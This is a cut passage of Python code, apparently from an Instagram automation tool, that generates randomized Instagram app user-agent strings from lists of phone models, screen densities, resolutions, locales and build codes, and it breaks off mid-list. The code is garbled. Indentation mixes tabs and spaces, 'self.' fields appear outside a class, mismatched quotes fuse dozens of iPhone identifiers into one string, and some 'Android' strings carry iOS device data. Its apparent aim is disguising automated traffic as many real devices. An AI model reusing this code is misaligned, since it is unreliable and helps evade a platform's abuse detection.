	mereek1 = rc(["SM-A325M","RMX3363","CPH2465","Z60s","5087Z","moto g(6) plus","22111317PG","samsung R883T","Seattle","KFRAWI","Pixel 7 Pro","M2007J3SG","R7kf","PEPM00","SM-N910F","M2007J17C","M2101K7BNY","2201116SC","M2011K2C","Redmi Note 11R","iPhone8,2','iPhone8,3','iPhone13,2','iPhone13,1','iPhone12,1','iPhone12,2','iPhone13,1','iPhone13,2','iPhone14,1','iPhone14,2','iPhone14,5','iPhone15,2','iPhone15,1','iPhone16,2','iPhone16,1','iPhone12,5','iPhone11,6','iPhone11,8','iPhone9,3','iPhone9,4','iPad7,1','iPad7,2','iPad7,3','iPad7,4','iPhone6,1','iPhone6,2','iPhone5,1','iPhone5,2','iPhone7,1','iPhone7,2','iPhone4,1','iPhone5,3','iPhone5,4','iPhone6,3','iPhone6,4','iPhone7,3','iPhone8,5','iPhone8,6','iPhone8,7','iPhone9,2','iPhone9,1','iPhone10,1','iPhone10,2','iPhone11,4','iPhone11,8','iPhone12,3','iPhone12,8','iPhone13,3','iPhone13,4','iPhone14,4','iPhone14,6','iPad8,1','iPad8,2','iPad8,3','iPad8,4','iPad9,1','iPad9,2','iPad9,3','iPad9,4','iPad10,1','iPad10,2','iPad10,3','iPad10,4','iPad11,1','iPad11,2','iPad12,1','iPad12,2','iPad13,1','iPad13,2','iPad13,4','iPad13,5','iPad14,1','iPad14,2','iPad14,3','iPad14,4','iPhone14,7','iPhone14,8','iPhone15,3','iPhone15,4','iPhone5,5','iPhone6,5','iPhone6,6','iPhone7,4','iPhone8,8','iPhone10,3','iPhone10,4','iPhone11,2','iPhone11,3','iPhone11,4','iPhone11,5','iPhone11,7','iPhone12,6','iPhone12,7','iPhone13,5','iPhone13,6','iPhone13,7"])
	mereek2 = rc(["a32","RE54ABL1","OP5958L1","Z60s","Doha_TMO","evert_nt","moonstone","R883T","raspite","cheetah","apollo","R7f","OP4ECB","trlte"])
	mereek3 = rc(["mt6769t","qcom","mt6739","mt6762","mt8169","cheetah","trlte"])
	ua1 = f' {versi} Android ({andro}; {dpis}; {pxl}; {mereek}; {mereek1}; {mereek2}; {mereek3}; {basa}; {kode})'
	ua2 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; Xiaomi; {redmis}; qcom; {basa}; {kode})'
	ua3 = f'Instagram {versi} (iPhone14,2; iOS 17_4_1; it_IT; it; scale=3.00; {pxl}; {basa}; {kode}; NW/3)'
	ua4 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; asus; ASUS_Z01RD; ASUS_Z01R_1; {basa}; {kode})'
	ua5 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; samsung; SM-G965U; star2qltesq; {basa}; {kode})'
	ua6 = f'Instagram {versi} Android ({andro}; {dpis}; (iPhone8,2; iOS 13_3_1; {basa}; {pxl}; {kode})'
	ua7 = f'Instagram {versi} Android ({andro}; {dpis}; (iPhone9,3; iOS 13_3; {basa}; {kode})'
	ua8 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; (iPhone10,1; iOS 11_2_6; {basa}; {pxl}; {kode})'
	ua9 = f'Instagram {versi} Android ({andro}; {dpis}; (iPhone10,6; iOS 13_3_1; {basa}; {pxl}; {kode}) AppleWebKit/420+'
	ua10 = f'Instagram {versi} Android ({andro}; {dpis}; (iPhone12,1; iOS 13_3_1; {basa}; {pxl}; {kode})'
	ua11 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; HTC/htc; HTC Desire 626; htc_a32ul_emea; {basa}; {kode})'
	ua12 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; realme; RMX3760; RE58C2; ums9230_hulk; {basa}; {kode})'
	ua13 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; realme; RMX3710; REE2ADL1; {basa}; {kode})'
	ua14 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; realme; RMX3830; RE58BC; ums9230_hulk;; {basa}; {kode})'
	ua15 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; vivo/iQOO; I2018; 2018; {basa}; {kode})'
	ua16 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; OPPO; CPH2529; OP56E8L1; {basa}; {kode})'
	ua17 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; OPPO; CPH2579; OP5759L1; {basa}; {kode})'
	ua18 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; OPPO; CPH2579; OP5759L1; {basa}; {kode})'
	ua19 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; Micromax; Micromax Q402+; Q402Plus; sp9832a_2h11; {basa}; {kode})'
	ua20 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; Google/google; Pixel 6; oriole; oriole; {basa}; {kode})'
	ua21 = f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; OPPO; PEPM00; OP4ECB; qcom; in_ID; {self.kode})'
    ua22 = f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; realme; RMX3782; RE5C6CL1; mt6835; in_ID; {self.kode})'
    ua23 = f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; samsung; GT-I9060I; grandneove3g; sc8830; in_ID)'
    ua24 = f'Instagram {self.apkv} Android ({self.Andr}; {self.Dpi}; {self.Ppxl}; HTC/htc; HTC Desire 616 dual sim; htc_v3_dug; mt6592; in_iD)'
    uaa = rc([ua1,ua2,ua3,ua4,ua5,ua6,ua7,ua8,ua9,ua10,ua11,ua12,ua13,ua14,ua15,ua16,ua17,ua18,ua19,ua20,ua21,ua22,ua23,ua24])
	return uaa

def Android_Version(android_version):
	if str(android_version) == '8':
		return ('28')
	elif str(android_version) == '9':
		return ('29')
	elif str(android_version) == '10':
		return ('30')
	elif str(android_version) == '11':
		return ('31')
	elif str(android_version) == '12':
		return ('32')
	elif str(android_version) == '13':
		return ('33')
	else:
		return ('34')

def UserAgentBarcelona():
	#; #
	dpis = random.choice(['320dpi','640dpi','213dpi','480dpi','420dpi','240dpi','280dpi','160dpi','560dpi','540dpi','272dpi','360dpi','720dpi','270dpi','450dpi','600dpi','279dpi','210dpi','180dpi','510dpi','300dpi','454dpi','314dpi','288dpi','401dpi','153dpi','267dpi','345dpi','493dpi','340dpi','604dpi','465dpi','680dpi','256dpi','290dpi','432dpi','273dpi','120dpi','200dpi','367dpi','419dpi','306dpi','303dpi','411dpi','195dpi','518dpi','230dpi','384dpi','315dpi','293dpi','274dpi','235dpi'])
	android_version = random.choice(['24/7.0','26/8.0.0','23/6.0.1','22/5.1.1','21/5.0.1','21/5.0.2','25/7.1.1','19/4.4.4','21/5.0','19/4.4.2','27/8.1.0','28/9','29/10','26/9','29/10','30/11','25/7.1.2'])
	language = random.choice(['ru_RU','en_GB','uk_UA','en_US','de_DE','it_IT','ru_UA','ar_AE','tr_TR','lv_LV','th_TH','fr_FR','sr_RS','hu_HU','bg_BG','pt_PT','pt_BR','es_ES','en_IE','nl_NL','fr_CH','de_CH','es_US','fr_CA','ru_BY','en_PH','en_AU','hy_AM','fa_IR','de_AT','cs_CZ','ru_KZ','en_CA','fr_BE','az_AZ','en_NZ','en_ZA','es_LA','ru_KG','pl_PL','es_MX','ro_RO','el_GR','iw_IL','in_ID','ga_IE','en_IN','ar_SA','ka_GE','es_CO','es_SV','hr_HR','ar_JO','es_PE','it_SM','ar_AR','en_SE','nb_NO','sk_SK','bs_BA','nl_BE','uz_UZ','sl_SI','es_CL'])
	pxl = random.choice(['720x1280','1440x2560','1440x2768','1280x720','1280x800','1080x1920','540x960','1080x2076','1080x2094','1080x2220','480x800','768x1024','1440x2792','1200x1920','720x1384','1920x1080','720x1369','800x1280','720x1440','1080x2058','600x1024','720x1396','2792x1440','1920x1200','2560x1440','1536x2048','720x1382','1080x2113','1080x2198','1080x2131','720x1423','1080x2069','720x1481','1080x2047','1080x2110','1080x2181','1080x2209','1080x2180','1080x2020','1080x2095','1440x2723','1080x2175','720x1365','1440x2699','1080x2218','2699x1440','1440x2907','1080x2257','720x1370','1080x2042','720x1372','1080x2200','1080x2186','720x1361','1080x2024','1080x2006','720x1402','1440x2831','720x1454','1080x2064','1440x2933','720x1411','720x1450','1440x2730','1080x2046','2094x1080','540x888','1440x2759','1080x2274','1080x2178','1440x2706','720x1356','720x1466','1440x2900','2560x1600','1080x2038','1600x2452','1080x2129','720x1422','720x1381','1080x2183','1080x2285','800x1216','1080x2216','1080x2168','1080x2119','1080x2128','1080x2273','2274x1080','1080x2162','1080x2164','2076x1080','1024x768','1080x2173','1440x2845','1080x2134','720x1379','1440x2838','1080x2139','2131x1080','1440x2744','1080x2192','720x1406','1440x2960','1080x2029','2042x1080','1080x2212','1406x720','1080x2288','2047x1080','1080x2051','720x1398','1280x736','1382x720','720x1353','1080x2050','1080x2028','1080x2256'])
	kode=rc(['104766893','104766900','102221278','104766888','105842053','93117670','94080607','96794592','102221279','100986894','ru_RU','94080606','103516660','98288242','103516666','103516653','uk_UA','96794590','100986893','102221277','95414344','99640920','99640911','96794591','ru_UA','99640905','100986890','107092313','99640900','93117667','100521966','90841939','98288239','89867440','105842051','de_DE','96794584','105842050','en_US','pt_PT','109556223','107092318','en_GB','108357722','112021130','107092322','119104798','108357720','119104802','112021131','100986892','113249569','107104231','fr_FR','pt_BR','109556226','116756948','113249553','113249561','110937441','118342010','120662545','117539703','119875222','110937448','121451799','115994877','108357718','120662547','107608058','122206624','95414346','107092308','112021128','90841948','119875229','117539698','120662550','en_NZ','123103748','91882538','121451810','91882537','118342006','113948109','122338251','110937453','es_US','118342005','121451793','109556219','119875225','en_CA','109556220','117539695','115211358','91882539','119104795','89867442','94080603','164094539','175574628','185203690','188791648','188791674','187682694','188791643','177770724','192992577','180322810','195435560','196643820','196643821','188791637','192992576','196643799','196643801','196643803','195435546','194383411','197825254','197825260','197825079','171727793','197825112','197825012','197825234','179155086','192992563','197825268','166149669','192992565','198036424','197825223','183982969','199325909','199325886','199325890','199325911','197825118','127049003','197825169','197825216','197825127','200395960','179155096','199325907','200396014','188791669','197825133','170693926','200396005','171727780','201577064','201576758','201577192','201775949','201576944','201775970','143631574','126223520','201775951','167338518','144612598','170693940','201775813','200395971','201775744','201775946','202766609','145652094','202766591','202766602','203083142','179155088','202766608','199325884','180322802','202766603','195435547','165030894','201576967','201775904','194383424','197347903','202766610','185203693','201576898','204019468','187682682','204019456','201775901','204019471','204019454','204019458','202766601','204019452','173238721','204019466','148324036','202766581','158441904','201576903','205280538','205280529','201576813','173238729','141753096','205280531','163022072','201576887','163022088','141753091','148324051','205280528','154400383','205280537','201576818','157405371','205858383','201576811','165031093','187682684','145652090','206670917','185203686','192992561','183982986','206670927','150338061','183982962','127049016','175574603','155374054','205858247','135374896','206670920','169474958','206670926','160497905','161478672','192992578','206670929','131223243','206670916','142841919','187682681','171727795','151414277','206670922','160497915','207505137','165030898','208061741','208061688','208180365','208061674','197825052','147375133','208061744','196643798','208061725','122338247','157536430','208061728','209143963','208727155','209143726','205280539','209143903','209143970','181496409','208061739','209143957','210180522','210180512','209143881','209143712','180322805','210180521','195435561','210370119','210180523','210180493','175574596','210180510','210180480','210180513','210180517','176649504','177770663','210180479','211114117','210908379','206670921','211114134','183982943','211399345','211399342','211399332','201775962','211574187','211574249','210180519','167338559','185203649','124583960','211399337','211399335','197825163','166149717','211399336','212063371','211399329','209143954','210180482','168361634','212214017','209143867','211399341','211399340','212214027','195435510','122338243','139237670','152367502','212676872','212676898','212676875','212676895','212676901','209823384','212676869','196643822','212676878','213367980','213368005','212676886','213558743','209143913','212214039','158441917','174081672','213558750','201775966','188791681','185203705','143631575','161478664','214245350','161478663','212676881','213558770','214245346','138226752','214245221','214245182','214245206','214245218','214245354','214245295','214245199','214245304','214245280','214446313','214245187','214245288','214139002','202766605','214245319','214646783','158441914','215246048','195435544','208061677','215464400','128676146','215464389','215464385','215464390','215464398','182747397','215464393','216233197','201775791','216817344','215464395','216817286','185203642','164094529','216817305','215464401','162439029','215464382','216817280','216817331','214330969','216817299','216817357','217948981','217948980','217948956','217948959','217948968','216817296','217948952','217948982','216817269','219308759','219308726','182747387','219308721','219308754','219308763','176649435','183982982','219909486','127049038','219308730','221134012','221134032','221134009','221134037','194383426','221134029','221134005','221134018','145652093','225283632','165031108','225283625','224652582','139906580','225283628','225283624','226142579','225283634','225283631','226493211','225283623','185203672','156514151','218793478','225283621','227299063','225283627','227299064','227299021','227299027','227544546','227299041','227299060','227299012','228970707','228970705','227299005','228970687','228970683','228970694','228970710','228970689','160497904','195435540','129611419','229783842','230291708','228970681','148324047','230877709','231192211','230877674','230877705','230877678','211399328','209143896','230877713','194383428','230877689','221134002','231457747','208061721','230877671','230877668','232868027','232088496','185203706','232868005','232867964','232868001','232868015','232868031','232867959','232868009','164094526','232867941','234041364','182747399','232868024','232867949','234847239','234847238','234847234','162439040','234847229','234847230','181496427','234847240','232867993','195435558','232867967','232867997','234847227','235871830','221133998','236572344','236572377','153386780','236572337','236572349','236572372','234847226','236572383','237507050','238093993','238093948','238093954','238093999','238093982','239490565','239490555','238093946','238093966','239490563','239490550','239974660','240726416','239490568','240726484','240726452','239490551','239490548','240726426','240726476','240726491','240726471','241043882','241114613','236572331','241267273','240726407','241456456','241267278','241267269','241114619','241456445','241456451','242168941','242168928','242168931','242168939','242168925','240726436','242375239','144722090','242168935','242290370','157405369','242168933','242290355','242703240','242807362','242168923','242168943','242991209','243646252','243646269','242991200','243711120','243646267','243711093','243975802','243646263','243646248','243646255','244167578','128676156','194383413','243975835','244390417','244390338','245196084','245196061','240726392','245196055','243646273','245196082','245196063','245196070','245666450','245466705','245870319','245870301','245870347','245196087','246889064','246889072','246889073','246889074','246889065','247146500','246889063','245870262','247370962','247146481','246889068','246889062','247541884','247541831','247370955','247370942','247720736','247720751','248310216','248310220','248310208','247720744','248399342','248310210','247720747','248310206','248717751','248310212','248310221','248823392','248583561','248310205','248899028','248955251','248955247','249178904','248955244','249507608','249507582','249507588','249507585','248955240','249507607','249507592','249810008','249966137','249507610','249966081','249966100','249507599','249966140','249810004','123790722','250188776','249628096','250188788','250742103','250742113','250742102','250877984','250742105','250742111','251048681','250742107','250742115','251048695','251304696','251304682','251524431','251530710','251304689','251524420','251524409','251524390','250742101','251048673','252055918','252055945','251920416','252055944','252055925','252239038','252055936','252055915','252055948','252390568','252390583','252580134','252740497','252740485','252740490','253120615','253325372','253325384','253325385','253447816','253146263','253120607','253325374','253120598','253325371','253447808','253447809','253325378','253447814','253447807','253447811','253447817','253447813','181496411','253447806','255191971','255013798','255777478','255777471','255777474','255777472','255959637','255777477','255959614','255959635','256099199','256099204','150338064','256099153','256099205','256099156','255983744','256107300','255777470','126223536','256203326','256099190','256099151','256324061','256324047','256203339','256966628','256966589','256966626','256966590','124584015','257456576','256966593','257456590','256966629','256966587','256966592','257456586','257456539','259829115','259829104','259829113','260037038','259829105','259829109','260037030','260149625','259829103','260149621','260465044','259829116','260724710','179155058','261079769','261079761','261079768','261079762','261079771','261276939','157405370','135374885','261079765','261393056','261393062','261079760','181496406','182747360','261504698','261690888','261504706','169474957','262218766','262290715','262290774','262372432','262372425','262372431','262886993','262886995','262372426','262886987','261079764','262886986','262886988','262886990','262372433','262886996','263652962','264009049','264009019','264009030','264009021','264009023','264009052','264009024','261763534','174081651','169474965','232867942','264009013','255959606','264009028','267397344','267397322','267925737','267397343','267925708','267397327','267397321','267925714','267258517','267925705','268773287','267925733','268773233','267925702','268773286','159526770','268773239','268773272','269790795','269285030','269790805','269790803','269790792','268773227','269849047','270426177','270426174','271182277','269790789','271182270','268773290','271182266','271182276','269790798','271182279','271182265','271182267','269790807','271823819','272382110','272382111','272382106','272693584','272382095','272382093','272382098','272382100','272382103','273728833','273371577','273728832','273728798','273907093','273907111','273907108','238093987','273907112','273907103','274774869','274774891','274774908','273907087','274774904','274774875','274774914','275292626','276027938','276028040','276027963','276028037','276028020','276028017','274774862','276028013','249507580','276028029','273907098','277249238','277249248','277249249','276028033','277249250','277249226','275292623','277249214','277249242','277249237','277249240','278625447','278002558','278625420','278625431','278625423','117539687','278625416','278625444','277249213','278625451','279469964','279996068','279996060','279996067','279996058','280194220','279996065','279996063','279996061','279996059','280894196','273728787','271182262','281579032','281579023','276514494','281579021','281579027','281579033','268773274','283072590','281579025','283072571','282619332','283489774','283072587','283072567','281579031','283072580','283072574','284459213','284459224','179155089','256966583','284459214','283072585','284459218','284459223','284459225','285338607','275113919','284459221','284459212','284459215','285855793','285855800','285855803','285855791','285855802','285855804','285855795','286809973','287420974','287421023','287420968','287420979','287421017','287421005','287421019','287421012','277249241','288682406','287421026','288682405','288682397','288682407','261079772','288682398','288682401','288205409','289692198','287420997','289692186'])
	igv=("42.0.0.19.95,42.0.0.19.95,42.0.0.19.95,40.0.0.14.95,42.0.0.19.95,42.0.0.19.95,43.0.0.10.97,42.0.0.19.95,42.0.0.19.95,33.0.0.11.92,45.0.0.17.93,43.0.0.10.97,45.0.0.17.93,43.0.0.10.97,20.0.0.29.75,46.0.0.15.96,48.0.0.15.98,47.0.0.16.96,47.0.0.16.96,24.0.0.12.201,44.0.0.9.93,54.0.0.14.82,23.0.0.14.135,28.0.0.7.284,51.0.0.20.85,24.0.0.12.201,45.0.0.17.93,55.0.0.12.79,28.0.0.7.284,55.0.0.12.79,55.0.0.12.79,48.0.0.15.98,46.0.0.15.96,27.0.0.11.97,55.0.0.12.79,56.0.0.13.78,27.0.0.11.97,44.0.0.9.93,45.0.0.17.93,27.0.0.11.97,24.0.0.12.201,56.0.0.13.78,51.0.0.20.85,44.0.0.9.93,32.0.0.16.94,44.0.0.9.93,45.0.0.17.93,48.0.0.15.98,46.0.0.15.96,24.0.0.12.201,23.0.0.14.135,43.0.0.10.97,45.0.0.17.93,44.0.0.9.93,48.0.0.15.98,46.0.0.15.96,25.0.0.26.136,49.0.0.15.89,12.0.0.7.91,49.0.0.15.89,32.0.0.16.94,24.0.0.12.201,43.0.0.10.97,44.0.0.9.93,54.0.0.14.82,25.0.0.26.136,25.0.0.26.136,56.0.0.13.78,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,23.0.0.14.135,32.0.0.16.94,46.0.0.15.96,23.0.0.14.135,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,27.0.0.11.97,48.0.0.15.98,27.0.0.11.97,49.0.0.15.89,45.0.0.17.93,55.0.0.12.79,43.0.0.10.97,27.0.0.11.97,59.0.0.23.76,43.0.0.10.97,48.0.0.15.98,24.0.0.12.201,48.0.0.15.98,30.0.0.12.95,48.0.0.15.98,34.0.0.12.93,24.0.0.12.201,48.0.0.15.98,40.0.0.14.95,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,28.0.0.7.284,46.0.0.15.96,44.0.0.9.93,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,10.30.0,45.0.0.17.93,24.0.0.12.201,48.0.0.15.98,26.0.0.13.86,22.0.0.17.68,46.0.0.15.96,40.0.0.14.95,103.1.0.15.119,113.0.0.39.122,121.0.0.29.119,121.0.0.29.119,123.0.0.21.114,123.0.0.21.114,122.0.0.29.238,123.0.0.21.114,123.0.0.21.114,115.0.0.26.111,124.0.0.17.473,122.0.0.29.238,117.0.0.28.123,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,123.0.0.21.114,124.0.0.17.473,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,125.0.0.20.126,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,110.0.0.16.119,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,116.0.0.34.121,124.0.0.17.473,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,105.0.0.18.119,128.0.0.26.128,124.0.0.17.473,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,129.0.0.2.119,128.0.0.26.128,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,120.0.0.29.118,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,66.0.0.11.101,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,130.0.0.31.121,116.0.0.34.121,127.0.0.30.121,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,124.0.0.17.473,129.0.0.29.119,129.0.0.29.119,130.0.0.31.121,128.0.0.26.128,130.0.0.31.121,130.0.0.31.121,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,109.0.0.18.124,113.0.0.39.122,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,129.0.0.29.119,126.0.0.25.121,130.0.0.31.121,129.0.0.29.119,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,110.0.0.16.119,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,127.0.0.30.121,130.0.0.31.121,131.0.0.23.116,131.0.0.23.116,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,130.0.0.31.121,8.4.0,131.0.0.23.116,131.0.0.25.116,129.0.0.29.119,82.0.0.13.119,129.0.0.29.119,65.0.0.12.86,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,124.0.0.17.473,36.0.0.13.91,106.0.0.24.118,131.0.0.25.116,131.0.0.25.116,83.0.0.20.111,131.0.0.25.116,109.0.0.18.124,36.0.0.13.91,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,84.0.0.21.105,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,133.0.0.7.120,116.0.0.34.121,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,117.0.0.28.123,123.0.0.21.114,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,126.0.0.25.121,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,104.0.0.21.118,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,125.0.0.20.126,132.0.0.26.134,132.0.0.26.134,128.0.0.19.128,132.0.0.26.134,121.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,122.0.0.29.238,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,131.0.0.25.116,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,128.0.0.26.128,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,123.0.0.21.114,133.0.0.32.120,127.0.0.30.121,133.0.0.32.120,133.0.0.32.120,123.0.0.21.114,133.0.0.32.120,131.0.0.23.116,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,131.0.0.25.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,133.0.0.32.120,111.1.0.25.152,133.0.0.32.120,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,130.0.0.31.121,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,87.0.0.18.99,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,97.0.0.32.119,131.0.0.25.116,129.0.0.29.119,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,127.0.0.30.121,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,111.1.0.25.152,129.0.0.29.119,134.0.0.26.121,131.0.0.25.116,134.0.0.26.121,134.0.0.26.121,84.0.0.21.105,127.0.0.30.121,134.0.0.26.121,124.0.0.17.473,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,80.0.0.14.110,133.0.0.32.120,134.0.0.26.121,123.0.0.21.114,134.0.0.26.121,102.0.0.20.117,131.0.0.23.116,131.0.0.25.116,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,102.0.0.20.117,80.0.0.14.110,87.0.0.18.99,134.0.0.26.121,93.1.0.19.102,134.0.0.26.121,134.0.0.26.121,129.0.0.29.119,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,122.0.0.29.238,134.0.0.26.121,134.0.0.26.121,124.0.0.17.473,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,96.0.0.28.114,129.0.0.29.119,131.0.0.25.116,131.0.0.23.116,135.0.0.15.119,124.0.0.17.473,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,131.0.0.25.116,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,129.0.0.29.119,134.0.0.26.121,134.0.0.26.121,131.0.0.25.116,131.0.0.23.116,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,123.0.0.21.114,134.0.0.26.121,130.0.0.31.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,131.0.0.23.116,104.0.0.21.118,122.0.0.29.238,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,127.0.0.30.121,134.0.0.26.121,134.0.0.26.121,123.0.0.21.114,133.0.0.32.120,123.0.0.21.114,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,1